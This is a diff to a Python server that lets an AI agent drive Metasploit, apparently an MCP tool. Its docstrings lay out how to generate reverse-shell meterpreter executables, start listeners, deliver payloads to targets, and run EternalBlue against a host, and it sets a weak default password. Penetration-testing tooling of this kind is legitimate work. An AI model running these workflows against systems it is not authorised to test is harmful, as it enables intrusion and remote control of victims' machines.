@@ -28,7 +28,7 @@ logger = logging.getLogger("metasploit_mcp_server")
 session_shell_type: Dict[str, str] = {}
 
 # Metasploit Connection Config (from environment variables)
-MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'yourpassword')
+MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'msf')
 MSF_SERVER = os.getenv('MSF_SERVER', '127.0.0.1')
 MSF_PORT_STR = os.getenv('MSF_PORT', '55553')
 MSF_SSL_STR = os.getenv('MSF_SSL', 'false')
@@ -659,7 +659,11 @@ async def _execute_module_rpc(
              missing = getattr(module_obj, 'missing_required', [])
              return {"status": "error", "message": f"Missing/invalid options for {full_module_path}: {e}", "missing_required": missing}
         elif "invalid payload" in error_str:
-             return {"status": "error", "message": f"Invalid payload specified: {payload_name_for_log or 'None'}. {e}"}
+             # Provide helpful error message with suggestions
+             error_msg = f"Invalid payload specified: {payload_name_for_log or 'None'}. "
+             error_msg += f"To view compatible payloads for this exploit, use: list_payloads(exploit_module='{module_name}'). "
+             error_msg += f"Original error: {e}"
+             return {"status": "error", "message": error_msg}
         return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
     except Exception as e:
         logger.exception(f"Unexpected error executing module {full_module_path} via RPC")
@@ -745,6 +749,17 @@ async def _execute_module_console(
                 # Basic error check in setup output
                 if any(err in setup_output for err in ["[-] Error setting", "Invalid option", "Unknown module", "Failed to load"]):
                     error_msg = f"Error during setup command '{cmd}': {setup_output}"
+                    
+                    # Check if this is a payload-related error
+                    if "set PAYLOAD" in cmd and ("Invalid option" in setup_output or "Error setting" in setup_output):
+                        # Extract base module name for error message
+                        base_module_name = module_name
+                        if '/' in module_name:
+                            parts = module_name.split('/')
+                            if parts[0] != 'exploit':
+                                base_module_name = module_name
+                        error_msg += f"\n\nTo view compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
+                    
                     logger.error(error_msg)
                     return {"status": "error", "message": error_msg, "module": full_module_path}
                 
@@ -790,6 +805,16 @@ async def _execute_module_console(
                  status = "error" if status != "warning" else status # Don't override warning if session might have opened
                  message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                  logger.error(f"Failure detected in console output for {full_module_path}.")
+                 
+                 # Check if the failure might be payload-related
+                 if payload_name_for_log and any(term in module_output.lower() for term in ['payload', 'incompatible', 'invalid']):
+                     # Extract base module name for error message
+                     base_module_name = module_name
+                     if '/' in module_name:
+                         parts = module_name.split('/')
+                         if parts[0] != 'exploit':
+                             base_module_name = module_name
+                     message += f"\n\nThe failure may be payload-related. To view compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
 
 
             return {
@@ -857,28 +882,65 @@ async def list_exploits(search_term: str = "") -> List[str]:
         return [f"Error: Unexpected error listing exploits: {e}"]
 
 @mcp.tool()
-async def list_payloads(platform: str = "", arch: str = "") -> List[str]:
+async def list_payloads(platform: str = "", arch: str = "", exploit_module: str = "") -> List[str]:
     """
-    List available Metasploit payloads, optionally filtered by platform and/or architecture.
+    List available Metasploit payloads, optionally filtered by platform, architecture, and/or exploit module compatibility.
 
     Args:
         platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
         arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').
+        exploit_module: Optional exploit module name to list only compatible payloads (e.g., 'windows/smb/ms17_010_eternalblue').
+                       When provided, only payloads compatible with this exploit module will be returned.
 
     Returns:
-        List of payload names matching filters (max 100).
+        List of payload names matching filters (max 100). If exploit_module is provided, returns compatible payloads for that module.
     """
     client = get_msf_client()
-    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}')")
+    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}', exploit: '{exploit_module or 'Any'}')")
+    
     try:
-        # Add timeout to prevent hanging on slow/unresponsive MSF server
-        logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
-        payloads = await asyncio.wait_for(
-            asyncio.to_thread(lambda: client.modules.payloads),
-            timeout=RPC_CALL_TIMEOUT
-        )
-        logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
-        filtered = payloads
+        # If exploit_module is provided, get compatible payloads for that module
+        if exploit_module:
+            logger.info(f"Getting compatible payloads for exploit module: {exploit_module}")
+            try:
+                # Get the module object
+                module_obj = await _get_module_object('exploit', exploit_module)
+                
+                # Get compatible payloads using MSF RPC API
+                # The module.compatible_payloads method returns payloads compatible with the exploit
+                logger.debug(f"Calling module.compatible_payloads for {exploit_module} with {RPC_CALL_TIMEOUT}s timeout...")
+                compatible = await asyncio.wait_for(
+                    asyncio.to_thread(lambda: module_obj.compatible_payloads),
+                    timeout=RPC_CALL_TIMEOUT
+                )
+                logger.debug(f"Retrieved {len(compatible)} compatible payloads for {exploit_module}.")
+                
+                # compatible_payloads returns a list of payload names
+                filtered = compatible
+                
+            except ValueError as ve:
+                # Module not found
+                logger.error(f"Exploit module '{exploit_module}' not found: {ve}")
+                return [f"Error: Exploit module '{exploit_module}' not found. Please verify the module name using list_exploits."]
+            except AttributeError:
+                # If compatible_payloads doesn't exist, fall back to getting all payloads and filtering
+                logger.warning(f"Module object for '{exploit_module}' doesn't support compatible_payloads. Falling back to listing all payloads.")
+                payloads = await asyncio.wait_for(
+                    asyncio.to_thread(lambda: client.modules.payloads),
+                    timeout=RPC_CALL_TIMEOUT
+                )
+                filtered = payloads
+        else:
+            # Add timeout to prevent hanging on slow/unresponsive MSF server
+            logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
+            payloads = await asyncio.wait_for(
+                asyncio.to_thread(lambda: client.modules.payloads),
+                timeout=RPC_CALL_TIMEOUT
+            )
+            logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
+            filtered = payloads
+        
+        # Apply platform and arch filters if provided
         if platform:
             plat_lower = platform.lower()
             # Match platform at the start of the payload path segment or within common paths
@@ -922,6 +984,31 @@ async def generate_payload(
     """
     Generate a Metasploit payload using the RPC API (payload.generate).
     Saves the generated payload to a file on the server if successful.
+    
+    IMPORTANT - LISTENER REQUIREMENT:
+    After generating a payload, you MUST use start_listener() to set up a handler that will
+    catch connections from the generated payload when it's executed on a target system.
+    
+    WORKFLOW:
+    1. Call generate_payload() to create the payload file (e.g., .exe, .elf, .py)
+    2. Call start_listener() with matching payload_type, LHOST, and LPORT
+    3. Distribute/execute the generated payload file on the target
+    4. The target will connect back to your listener and establish a session
+    
+    EXAMPLE - CORRECT USAGE:
+        # Step 1: Generate payload
+        result = await generate_payload(
+            payload_type='windows/meterpreter/reverse_tcp',
+            format_type='exe',
+            options={'LHOST': '10.0.0.1', 'LPORT': 4444}
+        )
+        # Step 2: Start matching listener
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
+        # Step 3: Deliver and execute the payload file on target (outside Metasploit)
+    
+    NOTE: This is different from run_exploit() which automatically handles listener creation
+    when running exploit modules. Use generate_payload() + start_listener() when you need
+    standalone payload files for manual delivery.
 
     Args:
         payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp).
@@ -1105,13 +1192,42 @@ async def run_exploit(
     """
     Run a Metasploit exploit module with specified options. Handles async (job)
     and sync (console) execution, and includes session polling for jobs.
+    
+    IMPORTANT - LISTENER HANDLING:
+    This function AUTOMATICALLY sets up the necessary listener/handler when you provide
+    a payload_name and payload_options. DO NOT call start_listener() separately for the
+    same payload/port combination - this will cause port conflicts and failures.
+    
+    WHEN TO USE start_listener() vs run_exploit():
+    - Use ONLY run_exploit() when: Running an exploit that needs a reverse shell/meterpreter
+      connection back to you. The exploit will handle the listener automatically.
+    - Use start_listener() ONLY when: 
+      * You need a standalone listener NOT tied to a specific exploit run
+      * You're using manually generated payloads (from generate_payload) that need a handler
+      * You need a persistent listener that survives multiple connection attempts
+      * You're coordinating multi-stage attacks where the listener must exist before the exploit
+    
+    EXAMPLE - CORRECT USAGE (run_exploit handles listener):
+        await run_exploit(
+            module_name='exploit/multi/handler',
+            options={},
+            payload_name='windows/meterpreter/reverse_tcp',
+            payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444}
+        )
+        # No need to call start_listener() - it's automatic!
+    
+    EXAMPLE - INCORRECT USAGE (duplicate listener):
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # Creates listener on port 4444
+        await run_exploit(..., payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port already in use!
 
     Args:
         module_name: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
         options: Dictionary of exploit module options (e.g., {'RHOSTS': '192.168.1.1'}).
         payload_name: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
+                     When specified, this function AUTOMATICALLY creates the handler/listener.
         payload_options: Dictionary of payload options (e.g., {'LHOST': '...', 'LPORT': ...})
                         or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
+                        AUTOMATICALLY creates the listener on the specified LHOST/LPORT.
         run_as_job: If False (default), run sync via console. If True, run async via RPC.
         check_vulnerability: If True, run module's 'check' action first (if available).
         timeout_seconds: Max time for synchronous run via console.
@@ -1196,7 +1312,7 @@ async def run_exploit(
 async def run_post_module(
     module_name: str,
     session_id: int,
-    options: Dict[str, Any] = None,
+    options: Optional[Dict[str, Any]] = None,
     run_as_job: bool = False,
     timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT
 ) -> Dict[str, Any]:
@@ -1588,7 +1704,16 @@ async def send_session_command(
 
 @mcp.tool()
 async def list_listeners() -> Dict[str, Any]:
-    """List all active Metasploit jobs, categorizing exploit/multi/handler jobs."""
+    """
+    List all active Metasploit jobs, categorizing exploit/multi/handler jobs as "handlers".
+    
+    This function returns both:
+    - handlers: Active listeners (exploit/multi/handler) created by start_listener() or run_exploit()
+    - other_jobs: Other background jobs (auxiliary modules, post-exploitation, etc.)
+    
+    Use this to check what listeners are currently active before starting new ones to avoid
+    port conflicts. Each handler entry includes job_id, name, and datastore (with LHOST/LPORT).
+    """
     client = get_msf_client()
     logger.info("Listing active listeners/jobs")
     try:
@@ -1664,6 +1789,41 @@ async def start_listener(
 ) -> Dict[str, Any]:
     """
     Start a new Metasploit handler (exploit/multi/handler) as a background job.
+    
+    CRITICAL - WHEN TO USE THIS vs run_exploit():
+    DO NOT use this function if you're about to call run_exploit() with a payload! 
+    The run_exploit() function AUTOMATICALLY creates its own listener when you provide
+    payload_name and payload_options. Using both will cause port conflicts and failures.
+    
+    USE start_listener() ONLY FOR THESE SCENARIOS:
+    1. Standalone listeners for manually generated payloads (from generate_payload tool)
+       - Example: Generate a .exe payload, then start listener to catch it when executed
+    2. Persistent listeners that must remain active across multiple connection attempts
+       - Example: Setting up a handler before distributing payload files to multiple targets
+    3. Listeners needed BEFORE running non-Metasploit attack tools
+       - Example: Using external tools/scripts that connect back to Metasploit handlers
+    4. Pre-staging listeners for multi-stage attacks where timing is critical
+       - Example: Listener must exist before triggering external payload delivery
+    
+    DO NOT USE start_listener() when:
+    - You're about to call run_exploit() with a payload - it handles the listener automatically
+    - You're running any Metasploit exploit module - use run_exploit() instead
+    
+    EXAMPLE - CORRECT USAGE (standalone listener for generated payload):
+        # Generate a payload executable
+        result = await generate_payload('windows/meterpreter/reverse_tcp', 'exe', 
+                                       lhost='10.0.0.1', lport=4444)
+        # Start listener to catch connections from that payload
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
+        # Now distribute/execute the generated payload file elsewhere
+    
+    EXAMPLE - INCORRECT USAGE (conflicts with run_exploit):
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # DON'T DO THIS
+        await run_exploit('exploit/windows/smb/ms17_010_eternalblue',
+                         options={'RHOSTS': '192.168.1.10'},
+                         payload_name='windows/meterpreter/reverse_tcp',
+                         payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port conflict!
+        # CORRECT: Just use run_exploit() alone - it creates the listener automatically
 
     Args:
         payload_type: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
